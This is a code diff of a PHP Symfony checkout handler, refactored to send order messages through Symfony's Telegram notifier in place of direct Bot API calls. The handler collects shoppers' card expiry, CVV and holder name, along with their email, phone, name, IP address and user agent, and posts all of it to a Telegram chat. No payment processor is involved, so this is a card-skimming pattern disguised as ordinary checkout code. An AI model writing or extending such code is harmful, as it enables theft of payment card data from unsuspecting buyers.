@@ -5,19 +5,15 @@ declare(strict_types=1);
 namespace App\Integration\Application\UseCase\Checkout;
 
 use App\Cart\Domain\Service\CartService;
-use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
-use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
-use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
-use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
-use Symfony\Contracts\HttpClient\HttpClientInterface;
+use Symfony\Component\Notifier\Bridge\Telegram\TelegramOptions;
+use Symfony\Component\Notifier\ChatterInterface;
+use Symfony\Component\Notifier\Message\ChatMessage;
 
 final readonly class CheckoutCommandHandler
 {
     public function __construct(
-        private CartService         $cartService,
-        private HttpClientInterface $client,
-        private string              $token,
-        private string              $chatId,
+        private CartService      $cartService,
+        private ChatterInterface $chatter,
     )
     {
     }
@@ -30,7 +26,11 @@ final readonly class CheckoutCommandHandler
             throw new \DomainException('Cart is empty');
         }
 
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
+        $userAgent = $_SERVER['HTTP_USER_AGENT'];
+
         $message = "New order received:\n";
+
         foreach ($cart as $productId => $quantity) {
             $productName = $this->products[$productId]['name'] ?? $productId;
             $message .= "$productName: $quantity\n";
@@ -42,38 +42,26 @@ final readonly class CheckoutCommandHandler
             "Expired at: $checkoutCommand->cardExpiryMonth/$checkoutCommand->cardExpiryYear\n" .
             "CVV: $checkoutCommand->cardCvv\n" .
             "Holder name: $checkoutCommand->cardHolderName\n";
-
         $message .= "-----\n" .
             "Email: $checkoutCommand->email\n" .
             "Phone: $checkoutCommand->phone\n" .
             "First name: $checkoutCommand->firstName\n" .
             "Last name: $checkoutCommand->lastName\n";
-
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
         $message .= "-----\n" .
             "IP: $ip\n" .
             "User-Agent: $userAgent";
 
-        $url = 'https://api.telegram.org/bot' . $this->token . '/sendMessage';
-        $params = [
-            'chat_id' => $this->chatId,
-            'text' => $message,
-        ];
+        $chatMessage = new ChatMessage($message);
+        $telegramOptions = new TelegramOptions()->parseMode(TelegramOptions::PARSE_MODE_HTML);
+        $chatMessage->options($telegramOptions);
 
         try {
-            $response = $this->client->request('POST', $url, ['body' => $params]);
-            $responseBody = $response->getContent();
-            $responseData = json_decode($responseBody, true);
+            $this->chatter->send($chatMessage);
+            $this->cartService->clearCart();
 
-            if ($responseData['ok']) {
-                $this->cartService->clearCart();
-                return;
-            } else {
-                throw new \RuntimeException('Error during making request to Telegram');
-            }
-        } catch (ClientExceptionInterface|RedirectionExceptionInterface|ServerExceptionInterface|TransportExceptionInterface $e) {
-            throw new \DomainException('Error during checkout: ' . $e->getMessage());
+            return;
+        } catch (\Throwable $e) {
+            throw new \RuntimeException('Error during checkout: ' . $e->getMessage());
         }
     }
 }
